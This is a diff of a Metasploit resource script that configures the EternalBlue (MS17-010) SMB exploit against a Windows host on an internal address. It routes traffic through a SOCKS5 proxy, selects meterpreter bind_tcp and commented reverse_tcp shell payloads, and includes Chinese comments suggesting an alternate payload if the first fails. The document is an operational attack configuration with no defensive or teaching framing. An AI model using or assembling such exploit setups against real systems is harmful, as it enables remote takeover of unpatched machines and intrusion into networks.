@@ -3,13 +3,13 @@
 # set payload windows/x64/shell/reverse_tcp
 # set lhost 192.168.183.131
 
-# set payload windows/x64/meterpreter/bind_tcp_uuid
 
 setg proxies socks5:39.99.139.21:1234
 
 
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp
+# set payload windows/x64/meterpreter/bind_tcp_uuid # 不行试试这个
 set rhosts 192.168.52.138
 show targets
 set lhost 0.0.0.0  # 设置为可达网段
